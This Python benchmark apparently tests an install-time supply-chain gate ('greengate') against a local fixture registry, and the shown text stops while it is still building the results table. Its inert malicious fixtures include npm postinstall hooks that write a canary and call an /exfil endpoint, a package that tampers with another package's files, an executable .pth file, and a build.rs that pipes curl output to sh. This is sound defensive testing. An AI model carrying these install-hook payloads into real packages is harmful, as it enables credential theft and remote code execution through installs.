#!/usr/bin/env python3
"""Offline benchmark for `greengate install`; Python stdlib only.

Every scenario runs the real package manager (npm, pip, cargo) through
`greengate install` against a local fixture registry on 127.0.0.1: npm
packuments and tarballs, a crates.io sparse index, PyPI and crates.io
metadata, a PEP 503 simple index for pip, and an OSV stand-in. Nothing is
fetched from the internet.

Malicious fixtures carry inert payloads with observable effects: a canary
file in $HOME, a request to the fixture server's /exfil endpoint, a change to
another package's files, or a startup (.pth) file left in site-packages. A
trial is judged by whether the effect happened, not by greengate's word:

  preflight   greengate stopped the install before the payload could run
  prevented   the install went further (fetch, or a sandboxed run) but the
              payload had no effect
  after       the effect happened, and greengate failed the install
  missed      the effect happened and the install passed

Benign fixtures must install and work: `permitted`, or `blocked` (a false
block), `broken` (passed, but the package does not work), `incomplete`.

Each scenario runs with bubblewrap isolation and without. Each is also run
with registry metadata and OSV unreachable, where the only acceptable
results are incomplete (exit 3) or blocked: never a pass.
"""

import argparse
import base64
from collections import Counter
import gzip
import hashlib
import http.server
import io
import json
import os
from pathlib import Path
import platform
import shutil
import signal
import socket
import statistics
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import tomllib
import zipfile

HERE = Path(__file__).resolve().parent
BENCH = HERE.parent
REPO = BENCH.parent

OLD = "2020-01-01T00:00:00.000Z"
RECENT = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(time.time() - 10 * 86400))


# ── Fixture server ────────────────────────────────────────────────────────────

class Registry:
    """Everything the fixture server answers, built per run."""

    def __init__(self):
        self.files = {}          # path -> (content type, bytes)
        self.hits = []           # paths of /exfil and /prebuilt requests
        self.lock = threading.Lock()

    def add(self, path, body, ctype="application/json"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body).encode()
        elif isinstance(body, str):
            body = body.encode()
        self.files[path] = (ctype, body)


def serve(registry):
    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def reply(self, code, ctype, body):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            from urllib.parse import unquote
            path = unquote(self.path.split("?")[0])
            if path.startswith("/exfil/") or path.startswith("/prebuilt/"):
                with registry.lock:
                    registry.hits.append(path)
            if path.startswith("/exfil/"):
                return self.reply(200, "text/plain", b"ok")
            entry = registry.files.get(path)
            if entry is None:
                return self.reply(404, "application/json", b"{}")
            self.reply(200, *entry)

        def do_POST(self):
            length = int(self.headers.get("Content-Length") or 0)
            body = json.loads(self.rfile.read(length) or b"{}")
            if self.path == "/osv/v1/querybatch":
                results = [{} for _ in body.get("queries", [])]
                return self.reply(200, "application/json", json.dumps({"results": results}).encode())
            self.reply(404, "application/json", b"{}")

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


# ── npm fixtures ──────────────────────────────────────────────────────────────

def tgz(files):
    """A gzipped tarball of {path: text}."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        for name, text in files.items():
            data = text.encode() if isinstance(text, str) else text
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mtime = 1577836800
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    return gzip.compress(raw.getvalue(), mtime=0)


def npm_package(registry, base, name, versions):
    """Publish `name` with `versions`: {version: {scripts, deps, files,
    published, user, provenance, deprecated}}."""
    doc = {"name": name, "dist-tags": {}, "versions": {}, "time": {"created": OLD, "modified": RECENT}}
    for version, spec in versions.items():
        manifest = {"name": name, "version": version, "license": "MIT",
                    "dependencies": spec.get("deps", {}), "scripts": spec.get("scripts", {})}
        files = {"package/package.json": json.dumps(manifest, indent=1),
                 "package/index.js": "module.exports = 1;\n"}
        files.update({f"package/{k}": v for k, v in spec.get("files", {}).items()})
        tarball = tgz(files)
        safe = name.replace("/", "-").lstrip("@")
        tar_path = f"/npm/-/{safe}-{version}.tgz"
        registry.add(tar_path, tarball, "application/octet-stream")
        meta = dict(manifest)
        meta["dist"] = {
            "tarball": f"{base}{tar_path}",
            "integrity": "sha512-" + base64.b64encode(hashlib.sha512(tarball).digest()).decode(),
            "shasum": hashlib.sha1(tarball).hexdigest(),
        }
        if spec.get("provenance"):
            meta["dist"]["attestations"] = {"url": f"{base}/attest", "provenance": {"predicateType": "https://slsa.dev/provenance/v1"}}
        meta["_npmUser"] = {"name": spec.get("user", "maintainer")}
        if spec.get("deprecated"):
            meta["deprecated"] = spec["deprecated"]
        doc["versions"][version] = meta
        doc["time"][version] = spec.get("published", OLD)
        doc["dist-tags"]["latest"] = version
    registry.add(f"/npm/{name}", doc)


# ── PyPI fixtures ─────────────────────────────────────────────────────────────

def record_line(path, data):
    digest = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()
    return f"{path},sha256={digest},{len(data)}"


def wheel(directory, name, version, files, tag="py3-none-any"):
    """Write a wheel with {path: bytes|str} plus its dist-info."""
    dist = f"{name}-{version}.dist-info"
    content = {k: (v.encode() if isinstance(v, str) else v) for k, v in files.items()}
    content[f"{dist}/METADATA"] = f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n".encode()
    content[f"{dist}/WHEEL"] = f"Wheel-Version: 1.0\nGenerator: bench\nRoot-Is-Purelib: true\nTag: {tag}\n".encode()
    lines = [record_line(k, v) for k, v in content.items()] + [f"{dist}/RECORD,,"]
    content[f"{dist}/RECORD"] = ("\n".join(lines) + "\n").encode()
    path = directory / f"{name}-{version}-{tag}.whl"
    with zipfile.ZipFile(path, "w") as z:
        for k, v in content.items():
            z.writestr(k, v)
    return path


BACKEND = '''
import os, zipfile, base64, hashlib
{payload}
NAME, VERSION = "{name}", "{version}"
def _meta():
    return f"Metadata-Version: 2.1\\nName: {{NAME}}\\nVersion: {{VERSION}}\\n"
def get_requires_for_build_wheel(config_settings=None):
    return []
def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    d = os.path.join(metadata_directory, f"{{NAME}}-{{VERSION}}.dist-info")
    os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "METADATA"), "w").write(_meta())
    return os.path.basename(d)
def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    dist = f"{{NAME}}-{{VERSION}}.dist-info"
    files = {{f"{{NAME}}/__init__.py": b"VALUE = 1\\n", f"{{dist}}/METADATA": _meta().encode(),
             f"{{dist}}/WHEEL": b"Wheel-Version: 1.0\\nGenerator: bench\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n"}}
    rec = []
    for k, v in files.items():
        h = base64.urlsafe_b64encode(hashlib.sha256(v).digest()).rstrip(b"=").decode()
        rec.append(f"{{k}},sha256={{h}},{{len(v)}}")
    files[f"{{dist}}/RECORD"] = ("\\n".join(rec + [f"{{dist}}/RECORD,,"]) + "\\n").encode()
    name = f"{{NAME}}-{{VERSION}}-py3-none-any.whl"
    with zipfile.ZipFile(os.path.join(wheel_directory, name), "w") as z:
        for k, v in files.items():
            z.writestr(k, v)
    return name
'''


def sdist(directory, name, version, payload=""):
    """An sdist with an in-tree PEP 517 backend (no build requirements, so
    pip can build it offline). `payload` runs when pip imports the backend."""
    root = f"{name}-{version}"
    files = {
        f"{root}/pyproject.toml": '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["."]\n',
        f"{root}/backend.py": BACKEND.format(payload=payload, name=name, version=version),
        f"{root}/PKG-INFO": f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n",
    }
    path = directory / f"{name}-{version}.tar.gz"
    path.write_bytes(tgz(files))
    return path


def simple_index(registry, wheelhouse):
    """A PEP 503 index over the wheelhouse, so pip fetches over HTTP like
    from PyPI (local files would count as path sources, not registry ones)."""
    by_project = {}
    for f in sorted(wheelhouse.iterdir()):
        project = f.name.split("-")[0].lower().replace("_", "-")
        data = f.read_bytes()
        registry.add(f"/files/{f.name}", data, "application/octet-stream")
        by_project.setdefault(project, []).append(
            f'<a href="/files/{f.name}#sha256={hashlib.sha256(data).hexdigest()}">{f.name}</a>')
    for project, links in by_project.items():
        registry.add(f"/simple/{project}/", "<html><body>" + "".join(links) + "</body></html>", "text/html")


def pypi_metadata(registry, name, version, published=OLD):
    registry.add(f"/pypi/{name}/json", {
        "info": {"name": name, "version": version, "license_expression": "MIT"},
        "releases": {version: [{"filename": f"{name}-{version}.tar.gz", "packagetype": "sdist",
                                "upload_time_iso_8601": published, "yanked": False}]},
    })


# ── crates fixtures ───────────────────────────────────────────────────────────

def index_path(name):
    n = name.lower()
    if len(n) <= 2:
        return f"{len(n)}/{n}"
    if len(n) == 3:
        return f"3/{n[0]}/{n}"
    return f"{n[:2]}/{n[2:4]}/{n}"


def crate_entry(registry, base, name, version, data, deps):
    cksum = hashlib.sha256(data).hexdigest()
    registry.add(f"/crates/dl/{name}/{version}", data, "application/octet-stream")
    line = {"name": name, "vers": version, "deps": deps, "cksum": cksum, "features": {}, "yanked": False}
    path = f"/crates/index/{index_path(name)}"
    previous = registry.files.get(path, ("text/plain", b""))[1].decode()
    registry.add(path, previous + json.dumps(line) + "\n", "text/plain")
    api = f"/crates/api/v1/crates/{name}"
    doc = json.loads(registry.files.get(api, ("", b'{"versions": []}'))[1])
    doc["versions"].append({"num": version, "created_at": OLD, "yanked": False,
                            "published_by": {"login": "maintainer"}, "license": "MIT"})
    registry.add(api, doc)


def cached_crate(registry, base, name, version):
    """Serve a crate from the local cargo cache, with its real dependencies."""
    for cache in (Path.home() / ".cargo/registry/cache").glob("*/"):
        f = cache / f"{name}-{version}.crate"
        if f.exists():
            data = f.read_bytes()
            break
    else:
        raise FileNotFoundError(f"{name}-{version}.crate is not in the cargo cache")
    with tarfile.open(fileobj=io.BytesIO(data)) as tar:
        manifest = tomllib.loads(tar.extractfile(f"{name}-{version}/Cargo.toml").read().decode())
    deps = []
    tables = [(manifest.get("dependencies", {}), "normal", None),
              (manifest.get("build-dependencies", {}), "build", None)]
    for target, t in manifest.get("target", {}).items():
        tables.append((t.get("dependencies", {}), "normal", target))
    for table, kind, target in tables:
        for dep, spec in table.items():
            spec = spec if isinstance(spec, dict) else {"version": spec}
            deps.append({"name": dep, "req": spec.get("version", "*"), "features": spec.get("features", []),
                         "optional": spec.get("optional", False),
                         "default_features": spec.get("default-features", True),
                         "target": target, "kind": kind})
    crate_entry(registry, base, name, version, data, deps)


def fixture_crate(registry, base, name, version, files, deps=()):
    root = f"{name}-{version}"
    manifest = f'[package]\nname = "{name}"\nversion = "{version}"\nedition = "2021"\nlicense = "MIT"\n'
    if "build.rs" in files:
        manifest += 'build = "build.rs"\n'
    if deps:
        manifest += "\n[build-dependencies]\n" + "".join(f'{d} = "{r}"\n' for d, r in deps)
    content = {f"{root}/Cargo.toml": manifest, f"{root}/src/lib.rs": "pub fn value() -> u32 { 1 }\n"}
    content.update({f"{root}/{k}": v for k, v in files.items()})
    index_deps = [{"name": d, "req": f"^{r}", "features": [], "optional": False, "default_features": True,
                   "target": None, "kind": "build"} for d, r in deps]
    crate_entry(registry, base, name, version, tgz(content), index_deps)


# ── Scenarios ─────────────────────────────────────────────────────────────────

def payload_js(case, port):
    """Inert, observable: a canary in $HOME and a request to /exfil."""
    return ("node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-%s','x')}catch(e){}"
            ";fetch('http://127.0.0.1:%d/exfil/%s').catch(()=>{})\"" % (case, port, case))


def payload_py(case, port):
    return (
        "try:\n"
        f"    open(os.path.expanduser('~/pwned-{case}'), 'w').write('x')\n"
        "except Exception:\n    pass\n"
        "try:\n"
        "    import urllib.request\n"
        f"    urllib.request.urlopen('http://127.0.0.1:{port}/exfil/{case}', timeout=2)\n"
        "except Exception:\n    pass\n"
    )


SCENARIOS = [
    # id, label, ecosystem, description
    ("npm-transitive-postinstall", "malicious", "npm",
     "`npm ci`: a transitive dependency's postinstall steals $HOME and phones home; nothing is named on the command line"),
    ("npm-new-install-script", "malicious", "npm",
     "An established package's new version adds a postinstall the previous one did not have"),
    ("npm-provenance-regression", "malicious", "npm",
     "A new version without the publish provenance every earlier one had, carrying a payload"),
    ("npm-tamper-other-package", "malicious", "npm",
     "A postinstall rewrites another package's index.js"),
    ("npm-dependency-confusion", "malicious", "npm",
     "A private-scope package (@acme/*) resolves from the public registry"),
    ("pip-pth-wheel", "malicious", "pip",
     "A wheel ships an executable .pth file that runs at every Python start"),
    ("pip-sdist-backend", "malicious", "pip",
     "An sdist whose build backend steals $HOME and phones home while pip resolves it"),
    ("cargo-build-rs", "malicious", "cargo",
     "A crate whose build.rs shells out to download and run a payload"),
    ("npm-prebuilt-download", "benign", "npm",
     "A postinstall downloads a prebuilt binary (esbuild-style), allowlisted via script_network"),
    ("npm-native-build", "benign", "npm",
     "A postinstall compiles and runs a C helper with cc (node-gyp-style native build)"),
    ("npm-plain", "benign", "npm", "A package with no install scripts"),
    ("pip-native-wheel", "benign", "pip", "A wheel with a cc-compiled native library (loaded with ctypes)"),
    ("pip-sdist", "benign", "pip", "An sdist with an ordinary in-tree build backend"),
    ("pip-setuptools-pth", "benign", "pip", "A wheel shipping setuptools' distutils-precedence.pth startup file"),
    ("cargo-cc-build", "benign", "cargo", "A crate whose build.rs compiles C with the cc crate"),
]


def build_registry(base, port, root, compiler):
    """Publish every fixture. Returns (registry, wheelhouse)."""
    reg = Registry()
    old = {"published": OLD}
    recent = {"published": RECENT}
    # npm
    npm_package(reg, base, "app-lib", {"1.0.0": {**old, "deps": {"evil-helper": "1.0.0"}}})
    npm_package(reg, base, "evil-helper", {"1.0.0": {**old, "scripts": {"postinstall": payload_js("npm-transitive-postinstall", port)}}})
    npm_package(reg, base, "colorize", {
        "1.0.0": {**old},
        "1.0.1": {**recent, "user": "maintainer", "scripts": {"postinstall": payload_js("npm-new-install-script", port)}},
    })
    npm_package(reg, base, "signed-lib", {
        "2.0.0": {**old, "provenance": True},
        "2.0.1": {**recent, "files": {"lib.js": "module.exports = 2;\n"}},
    })
    npm_package(reg, base, "victim", {"1.0.0": {**old, "files": {"index.js": "module.exports = 'original';\n"}}})
    tamper = ("node -e \"try{require('fs').writeFileSync(require('path').join(process.cwd(),'..','victim','index.js'),"
              "'module.exports=\\'tampered\\';')}catch(e){}\"")
    npm_package(reg, base, "tamper", {"1.0.0": {**old, "scripts": {"postinstall": tamper}}})
    npm_package(reg, base, "@acme/billing", {"1.0.0": {**old, "scripts": {"postinstall": payload_js("npm-dependency-confusion", port)}}})
    reg.add("/prebuilt/bin", "prebuilt binary\n", "text/plain")
    fetch = ("node -e \"fetch('http://127.0.0.1:%d/prebuilt/bin').then(r=>r.text())"
             ".then(t=>require('fs').writeFileSync('bin.txt',t))\"" % port)
    npm_package(reg, base, "prebuilt-dl", {"1.0.0": {**old, "scripts": {"postinstall": fetch}}})
    npm_package(reg, base, "native-addon", {"1.0.0": {**old,
        "scripts": {"install": "cc -o helper helper.c && ./helper > built.txt"},
        "files": {"helper.c": '#include <stdio.h>\nint main(void){puts("built");return 0;}\n'}}})
    npm_package(reg, base, "plain-lib", {"1.0.0": {**old}})
    # PyPI
    wheelhouse = root / "wheelhouse"
    wheelhouse.mkdir()
    pth = ("import os; open(os.path.expanduser('~/pwned-pip-pth-wheel'), 'w').write('x')\n")
    wheel(wheelhouse, "evilpth", "1.0.0", {"evilpth/__init__.py": "", "evilpth_init.pth": pth})
    pypi_metadata(reg, "evilpth", "1.0.0")
    sdist(wheelhouse, "evilbuild", "1.0.0", payload_py("pip-sdist-backend", port))
    pypi_metadata(reg, "evilbuild", "1.0.0")
    sdist(wheelhouse, "goodbuild", "1.0.0")
    pypi_metadata(reg, "goodbuild", "1.0.0")
    if compiler:
        src = root / "native.c"
        src.write_text("int answer(void) { return 42; }\n")
        lib = root / "libnative.so"
        subprocess.run([compiler, "-shared", "-fPIC", "-o", str(lib), str(src)], check=True)
        loader = ("import ctypes, os\n_lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), 'libnative.so'))\n"
                  "def answer():\n    return _lib.answer()\n")
        wheel(wheelhouse, "nativewheel", "1.0.0",
              {"nativewheel/__init__.py": loader, "nativewheel/libnative.so": lib.read_bytes()},
              tag=f"py3-none-linux_{platform.machine()}")
        pypi_metadata(reg, "nativewheel", "1.0.0")
    # setuptools ships this .pth; it must not be mistaken for an attack.
    shim = ("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
            "enabled and __import__('_distutils_hack').add_shim(); \n")
    wheel(wheelhouse, "shimtools", "1.0.0", {"shimtools/__init__.py": "", "_distutils_hack/__init__.py":
          "def add_shim():\n    pass\n", "distutils-precedence.pth": shim})
    pypi_metadata(reg, "shimtools", "1.0.0")
    simple_index(reg, wheelhouse)
    # crates
    reg.add("/crates/index/config.json", {"dl": f"{base}/crates/dl/{{crate}}/{{version}}", "api": f"{base}/crates"})
    evil_build = ('use std::process::Command;\nfn main() {\n'
                  '    let _ = Command::new("sh").arg("-c")\n'
                  f'        .arg("curl -s http://127.0.0.1:{port}/exfil/cargo-build-rs | sh; touch $HOME/pwned-cargo-build-rs")\n'
                  '        .status();\n}\n')
    fixture_crate(reg, base, "evil-build", "1.0.0", {"build.rs": evil_build})
    try:
        cached_crate(reg, base, "cc", "1.2.0")
        cached_crate(reg, base, "shlex", "1.3.0")
        good_build = 'fn main() {\n    cc::Build::new().file("native.c").compile("native");\n}\n'
        fixture_crate(reg, base, "native-sys", "1.0.0",
                      {"build.rs": good_build, "native.c": "int answer(void) { return 42; }\n"},
                      deps=[("cc", "1.2.0")])
    except FileNotFoundError as e:
        print(f"note: {e}; cargo-cc-build will be skipped", file=sys.stderr)
    return reg, wheelhouse


# ── Trials ────────────────────────────────────────────────────────────────────

def invoke(command, cwd, env, timeout):
    start = time.monotonic()
    p = subprocess.Popen(command, cwd=cwd, env=env, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, start_new_session=True)
    try:
        out, _ = p.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        os.killpg(p.pid, signal.SIGKILL)
        p.communicate()
        return None, "timeout", time.monotonic() - start
    return p.returncode, out, time.monotonic() - start


def closed_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class Trial:
    def __init__(self, case, base, port, wheelhouse, binary, timeout, isolate, metadata_down):
        self.case, self.base, self.port = case, base, port
        self.wheelhouse, self.binary, self.timeout = wheelhouse, binary, timeout
        self.isolate, self.metadata_down = isolate, metadata_down
        self.tmp = Path(tempfile.mkdtemp(prefix="gg-gate-"))
        self.home = self.tmp / "home"
        self.project = self.tmp / "project"
        self.home.mkdir()
        self.project.mkdir()

    def env(self):
        meta = f"http://127.0.0.1:{closed_port()}" if self.metadata_down else None
        env = dict(os.environ)
        env.update({
            "HOME": str(self.home),
            "GREENGATE_CACHE_DIR": str(self.tmp / "gg-cache"),
            "GREENGATE_NPM_REGISTRY": meta or f"{self.base}/npm",
            "GREENGATE_PYPI_URL": meta or self.base,
            "GREENGATE_CRATES_URL": meta or f"{self.base}/crates",
            "GREENGATE_OSV_URL": meta or f"{self.base}/osv",
            "npm_config_cache": str(self.tmp / "npm-cache"),
            "npm_config_registry": f"{self.base}/npm/",
            "npm_config_audit": "false",
            "npm_config_fund": "false",
            "npm_config_update_notifier": "false",
            "CARGO_HOME": str(self.tmp / "cargo-home"),
            # A different HOME must not hide the installed Rust toolchain.
            "RUSTUP_HOME": os.environ.get("RUSTUP_HOME", str(Path.home() / ".rustup")),
            "PIP_DISABLE_PIP_VERSION_CHECK": "1",
        })
        return env

    def config(self, extra=""):
        (self.project / ".greengate.toml").write_text(
            "[supply_chain]\nslopsquat_check = false\n" + extra, encoding="utf-8")

    def npm_project(self, deps):
        (self.project / "package.json").write_text(json.dumps(
            {"name": "app", "version": "1.0.0", "dependencies": deps}), encoding="utf-8")

    def lock(self):
        env = self.env()
        code, out, _ = invoke(["npm", "install", "--package-lock-only", "--ignore-scripts"],
                              self.project, env, self.timeout)
        if code != 0:
            raise RuntimeError(f"fixture lockfile failed: {out[-400:]}")

    def venv(self):
        venv = self.tmp / "venv"
        subprocess.run([sys.executable, "-m", "venv", str(venv)], check=True, capture_output=True)
        return venv

    def cargo_project(self):
        (self.tmp / "cargo-home").mkdir()
        (self.tmp / "cargo-home/config.toml").write_text(
            '[source.crates-io]\nreplace-with = "fixture"\n'
            f'[source.fixture]\nregistry = "sparse+{self.base}/crates/index/"\n', encoding="utf-8")
        (self.project / "Cargo.toml").write_text(
            '[package]\nname = "app"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\n', encoding="utf-8")
        (self.project / "src").mkdir()
        (self.project / "src/main.rs").write_text("fn main() {}\n", encoding="utf-8")

    def greengate(self, args):
        cmd = [str(self.binary), "--report", str(self.tmp / "report.json"), "install",
               "--isolate", self.isolate] + args
        return invoke(cmd, self.project, self.env(), self.timeout)

    def report(self):
        try:
            return json.loads((self.tmp / "report.json").read_text())
        except (OSError, ValueError):
            return {}

    def cleanup(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


def setup_and_run(t, case):
    """Prepare the scenario's project, run greengate install, and return
    (exit code, output, seconds, effect: bool, works: bool|None)."""
    cid = case["id"]
    canary = lambda: (t.home / f"pwned-{cid}").exists()
    if cid == "npm-transitive-postinstall":
        t.config(); t.npm_project({"app-lib": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "ci"])
        return code, out, secs, canary(), None
    if cid == "npm-new-install-script":
        t.config(); t.npm_project({"colorize": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "install", "colorize@1.0.1"])
        return code, out, secs, canary(), None
    if cid == "npm-provenance-regression":
        t.config(); t.npm_project({"signed-lib": "2.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "install", "signed-lib@2.0.1"])
        # The regression is the signal; installing it at all is the effect.
        lib = t.project / "node_modules/signed-lib/lib.js"
        return code, out, secs, lib.exists() and code == 0, None
    if cid == "npm-tamper-other-package":
        t.config(); t.npm_project({"victim": "1.0.0", "tamper": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "ci"])
        victim = t.project / "node_modules/victim/index.js"
        return code, out, secs, victim.exists() and "tampered" in victim.read_text(), None
    if cid == "npm-dependency-confusion":
        t.config('internal_packages = ["@acme/*"]\n'); t.npm_project({})
        code, out, secs = t.greengate(["npm", "install", "@acme/billing"])
        return code, out, secs, canary() or (t.project / "node_modules/@acme/billing").exists(), None
    if cid == "pip-pth-wheel":
        t.config(); venv = t.venv()
        code, out, secs = t.greengate(["--pip", str(venv / "bin/pip"), "pip", "install", "--index-url",
                                       f"{t.base}/simple/", "evilpth"])
        # The payload runs at the next Python start.
        subprocess.run([str(venv / "bin/python"), "-c", "pass"], env=t.env(), capture_output=True)
        return code, out, secs, canary(), None
    if cid == "pip-sdist-backend":
        t.config(); venv = t.venv()
        code, out, secs = t.greengate(["--pip", str(venv / "bin/pip"), "pip", "install", "--index-url",
                                       f"{t.base}/simple/", "evilbuild"])
        return code, out, secs, canary(), None
    if cid == "pip-setuptools-pth":
        t.config(); venv = t.venv()
        code, out, secs = t.greengate(["--pip", str(venv / "bin/pip"), "pip", "install", "--index-url",
                                       f"{t.base}/simple/", "shimtools"])
        ok = subprocess.run([str(venv / "bin/python"), "-c", "import shimtools"], capture_output=True).returncode == 0
        return code, out, secs, False, ok
    if cid == "cargo-build-rs":
        t.config(); t.cargo_project()
        code, out, secs = t.greengate(["cargo", "add", "evil-build@1.0.0"])
        if code == 0:
            # Permitted: the payload runs at the next build.
            invoke(["cargo", "build", "-q"], t.project, t.env(), t.timeout)
        return code, out, secs, canary(), None
    if cid == "npm-prebuilt-download":
        t.config('allow_postinstall = ["prebuilt-dl"]\nscript_network = ["prebuilt-dl"]\n')
        t.npm_project({"prebuilt-dl": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "ci"])
        return code, out, secs, False, (t.project / "node_modules/prebuilt-dl/bin.txt").exists()
    if cid == "npm-native-build":
        t.config(); t.npm_project({"native-addon": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "ci"])
        return code, out, secs, False, (t.project / "node_modules/native-addon/built.txt").exists()
    if cid == "npm-plain":
        t.config(); t.npm_project({"plain-lib": "1.0.0"}); t.lock()
        code, out, secs = t.greengate(["npm", "ci"])
        return code, out, secs, False, (t.project / "node_modules/plain-lib/index.js").exists()
    if cid == "pip-native-wheel":
        t.config(); venv = t.venv()
        code, out, secs = t.greengate(["--pip", str(venv / "bin/pip"), "pip", "install", "--index-url",
                                       f"{t.base}/simple/", "nativewheel"])
        ok = subprocess.run([str(venv / "bin/python"), "-c", "import nativewheel; assert nativewheel.answer() == 42"],
                            capture_output=True).returncode == 0
        return code, out, secs, False, ok
    if cid == "pip-sdist":
        t.config(); venv = t.venv()
        code, out, secs = t.greengate(["--pip", str(venv / "bin/pip"), "pip", "install", "--index-url",
                                       f"{t.base}/simple/", "goodbuild"])
        ok = subprocess.run([str(venv / "bin/python"), "-c", "import goodbuild"], capture_output=True).returncode == 0
        return code, out, secs, False, ok
    if cid == "cargo-cc-build":
        t.config(); t.cargo_project()
        code, out, secs = t.greengate(["cargo", "add", "native-sys@1.0.0"])
        ok = None
        if code == 0:
            b, _, _ = invoke(["cargo", "build", "-q"], t.project, t.env(), t.timeout)
            ok = b == 0
        return code, out, secs, False, ok
    raise ValueError(cid)


def plain_install(case, t):
    """The same install without greengate, for the time overhead (benign only)."""
    cid = case["id"]
    if case["eco"] == "npm":
        return invoke(["npm", "ci"], t.project, t.env(), t.timeout)[2]
    if case["eco"] == "pip":
        venv = t.venv()
        pkg = {"pip-native-wheel": "nativewheel", "pip-sdist": "goodbuild", "pip-setuptools-pth": "shimtools"}[cid]
        return invoke([str(venv / "bin/pip"), "install", "--index-url", f"{t.base}/simple/", pkg],
                      t.project, t.env(), t.timeout)[2]
    if case["eco"] == "cargo":
        return invoke(["cargo", "add", "native-sys@1.0.0"], t.project, t.env(), t.timeout)[2]
    return None


def classify(case, code, effect, works, report):
    if code is None:
        return "error"
    if case["label"] == "malicious":
        if code not in (0, 1):
            return "error"  # a crash is never a detection
        blocked = code == 1 and bool(report.get("findings"))
        if not effect:
            fetched = any(c.get("id") in ("install:fetch", "install:execute") for c in report.get("checks", []))
            return "preflight" if blocked and not fetched else "prevented"
        return "after" if blocked else "missed"
    if code == 3:
        return "incomplete"
    if code == 1:
        return "blocked"
    if code != 0:
        return "error"
    return "permitted" if works in (True, None) else "broken"


def run_case(case, base, port, wheelhouse, binary, timeout, isolate, metadata_down, compiler):
    if case["id"] in ("npm-native-build", "pip-native-wheel") and not compiler:
        return {"outcome": "skipped", "note": "C compiler unavailable"}
    t = Trial(case, base, port, wheelhouse, binary, timeout, isolate, metadata_down)
    try:
        code, out, secs, effect, works = setup_and_run(t, case)
        report = t.report()
        outcome = classify(case, code, effect, works, report)
        if metadata_down:
            # Only incomplete or blocked is acceptable when the install needed
            # metadata; `npm ci` of an unchanged lockfile looks nothing up.
            looked_up = any(c.get("id", "").split("/")[-1].startswith(("registry-metadata", "osv"))
                            for c in report.get("checks", []))
            outcome = {3: "incomplete", 1: "blocked"}.get(code) or (
                ("passed unchecked" if looked_up else "nothing to look up") if code == 0 else "error")
        result = {"outcome": outcome, "exit_code": code, "seconds": round(secs, 2),
                  "effect": effect, "works": works, "status": report.get("status"),
                  "rules": sorted({f.get("rule") for f in report.get("findings", [])}),
                  "output": out[-3000:] if isinstance(out, str) else ""}
        if case["label"] == "benign" and not metadata_down and outcome == "permitted":
            plain = Trial(case, base, port, wheelhouse, binary, timeout, isolate, False)
            try:
                if case["eco"] == "npm":
                    plain.npm_project(json.loads((t.project / "package.json").read_text())["dependencies"])
                    plain.lock()
                elif case["eco"] == "cargo":
                    plain.cargo_project()
                result["plain_seconds"] = round(plain_install(case, plain), 2)
            finally:
                plain.cleanup()
        return result
    except (OSError, RuntimeError, subprocess.CalledProcessError) as e:
        return {"outcome": "error", "note": str(e)[-500:]}
    finally:
        t.cleanup()


# ── Report ────────────────────────────────────────────────────────────────────

def summarize(results):
    c = Counter()
    for r in results:
        for mode, trials in r["modes"].items():
            for tr in trials:
                c[(r["label"], mode, tr["outcome"])] += 1
    return c


def build_report(results, version, repeats, modes, metadata):
    c = summarize(results)
    lines = ["# greengate install gate — benchmark results", "",
             f"_Generated {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())} · greengate {version} · "
             f"{len(results)} scenarios · {repeats} trial(s) per scenario and mode._", "",
             "> `greengate install` driving real npm, pip and cargo against a local fixture registry. "
             "Payloads are inert but observable (a canary in $HOME, a request to the fixture server, "
             "a change to another package, a .pth left in site-packages); outcomes are judged by whether "
             "that effect happened. No internet access; no real malware.", ""]
    for mode in modes:
        mal = {k: c[("malicious", mode, k)] for k in ("preflight", "prevented", "after", "missed", "error", "skipped")}
        ben = {k: c[("benign", mode, k)] for k in ("permitted", "blocked", "broken", "incomplete", "error", "skipped")}
        total_mal = sum(mal[k] for k in ("preflight", "prevented", "after", "missed"))
        total_ben = sum(ben[k] for k in ("permitted", "blocked", "broken", "incomplete"))
        pct = lambda n, d: f"{100 * n / d:.0f}%" if d else "n/a"
        lines += [f"## `--isolate {mode}`", "",
                  "| Measure | Result |", "|---|---:|",
                  f"| Attacks stopped before the payload could run (preflight) | {mal['preflight']} / {total_mal} |",
                  f"| Attacks without effect after fetch or a sandboxed run (prevented) | {mal['prevented']} / {total_mal} |",
                  f"| Attacks that had their effect but failed the install | {mal['after']} / {total_mal} |",
                  f"| Attacks missed | {mal['missed']} / {total_mal} |",
